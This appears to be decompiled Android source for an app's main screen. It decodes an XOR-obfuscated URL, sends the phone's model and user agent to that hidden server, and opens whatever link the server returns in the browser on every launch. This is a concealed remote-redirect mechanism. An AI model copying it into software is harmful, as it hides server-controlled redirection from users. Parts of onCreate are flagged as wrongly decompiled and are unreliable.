package com.glasspulse.glasspulse;

import C.h;
import H.e;
import K.x0;
import K.z0;
import S0.c;
import T.u;
import a1.InterfaceC0058a;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.glasspulse.glasspulse.MainActivity;
import com.glasspulse.glasspulse.MainActivity2;
import com.glasspulse.glasspulse.R;
import g.AbstractActivityC0128i;
import i1.a;
import i1.l;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.m;
import m1.p;
import m1.q;
import q0.d;
import q1.g;
import q1.j;
import u1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0128i {

    /* renamed from: E, reason: collision with root package name */
    public static final /* synthetic */ int f1604E = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1605A = t(new byte[]{-111, 126, 83});

    /* renamed from: B, reason: collision with root package name */
    public final String f1606B = t(new byte[]{Byte.MIN_VALUE, 109, 70, -63});

    /* renamed from: C, reason: collision with root package name */
    public SharedPreferences f1607C;

    /* renamed from: D, reason: collision with root package name */
    public final c f1608D;

    /* renamed from: y, reason: collision with root package name */
    public final c f1609y;

    /* renamed from: z, reason: collision with root package name */
    public String f1610z;

    public MainActivity() {
        final int i = 0;
        this.f1609y = new c(new InterfaceC0058a(this) { // from class: o0.g

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f3378b;

            {
                this.f3378b = this;
            }

            @Override // a1.InterfaceC0058a
            public final Object a() {
                MainActivity mainActivity = this.f3378b;
                switch (i) {
                    case 0:
                        int i2 = MainActivity.f1604E;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new q0.d((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    default:
                        int i3 = MainActivity.f1604E;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
        final int i2 = 1;
        this.f1608D = new c(new InterfaceC0058a(this) { // from class: o0.g

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f3378b;

            {
                this.f3378b = this;
            }

            @Override // a1.InterfaceC0058a
            public final Object a() {
                MainActivity mainActivity = this.f3378b;
                switch (i2) {
                    case 0:
                        int i22 = MainActivity.f1604E;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new q0.d((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    default:
                        int i3 = MainActivity.f1604E;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
    }

    public static String t(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            int i4 = i3 + 1;
            int i5 = i3 % 4;
            arrayList.add(Byte.valueOf((byte) ((i5 != 0 ? i5 != 1 ? i5 != 2 ? 173 : 52 : 24 : 242) ^ (bArr[i2] & 255))));
            i2++;
            i3 = i4;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, a.f2499a);
    }

    /* JADX WARN: Code restructure failed: missing block: B:24:0x0166, code lost:
    
        r3 = r1;
     */
    @Override // g.AbstractActivityC0128i, a.l, android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1607C = getSharedPreferences(this.f1605A, 0);
        u();
        setContentView(((d) this.f1609y.a()).f3483a);
        SharedPreferences sharedPreferences = this.f1607C;
        g gVar2 = null;
        if (sharedPreferences == null) {
            b1.d.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1606B, null);
        if (string != null && !i1.d.E0(string)) {
            this.f1610z = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{Byte.MIN_VALUE, 109, 70, -63});
        String t3 = t(new byte[]{-51, 121, 68, -35, -49});
        String str = t(new byte[]{-102, 108, 64, -35, -127, 34, 27, -126, -117, 125, 88, -63, -99, 111, 25, -39, Byte.MIN_VALUE, 109, 64, -59, -33, 41, 6, -99, -62, 54, 83, -37, -98, 110, 66, -50, -103, 115, 91, Byte.MIN_VALUE, -101, 106, 70, -44, -100, 123, 95, -58, -109, 33, 7, -125, -123, 119, 70, -58, -105, 106, 71, -125, -106, 125, 66, -126}) + t3 + packageName;
        q qVar = new q(new p());
        u uVar = new u(6);
        b1.d.e(str, "url");
        if (l.w0(str, "ws:", true)) {
            String substring = str.substring(3);
            b1.d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.w0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            b1.d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        b1.d.e(str, "<this>");
        m1.l lVar = new m1.l();
        lVar.c(null, str);
        uVar.f816a = lVar.a();
        String t4 = t(new byte[]{-86, 53, 112, -56, -124, 113, 87, -56, -33, 85, 91, -55, -105, 116});
        String str2 = Build.MODEL;
        b1.d.d(str2, "MODEL");
        uVar.k(t4, str2);
        uVar.k(t(new byte[]{-77, 123, 87, -56, -126, 108, 25, -31, -109, 118, 83, -40, -109, Byte.MAX_VALUE, 81}), t(new byte[]{-105, 118, 25, -8, -95, 52, 81, -61, -55, 105, 9, -99, -36, 33}));
        String t5 = t(new byte[]{-89, 107, 81, -33, -33, 89, 83, -56, -100, 108});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        b1.d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.k(t5, defaultUserAgent);
        e b2 = uVar.b();
        j jVar = new j(qVar, b2);
        B.j jVar2 = new B.j(this, t2, 15);
        if (!jVar.f3529e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3966a;
        jVar.f3530f = n.f3966a.g();
        u uVar2 = qVar.f3244a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f817b).add(gVar3);
            String str3 = ((m) b2.f275c).d;
            Iterator it = ((ArrayDeque) uVar2.f818c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (b1.d.a(((m) gVar.f3523c.f3527b.f275c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f817b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (b1.d.a(((m) gVar.f3523c.f3527b.f275c).d, str3)) {
                        }
                    }
                }
            }
            if (gVar2 != null) {
                gVar3.f3522b = gVar2.f3522b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0128i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1610z;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        x0 x0Var;
        WindowInsetsController insetsController;
        u1.l.l0(getWindow(), false);
        Window window = getWindow();
        h hVar = new h(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            z0 z0Var = new z0(insetsController, hVar);
            z0Var.f447f = window;
            x0Var = z0Var;
        } else {
            x0Var = new x0(window, hVar);
        }
        x0Var.J();
        x0Var.m0();
    }

    public final void v() {
        startActivity((Intent) this.f1608D.a());
        finish();
    }

    public final void w(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
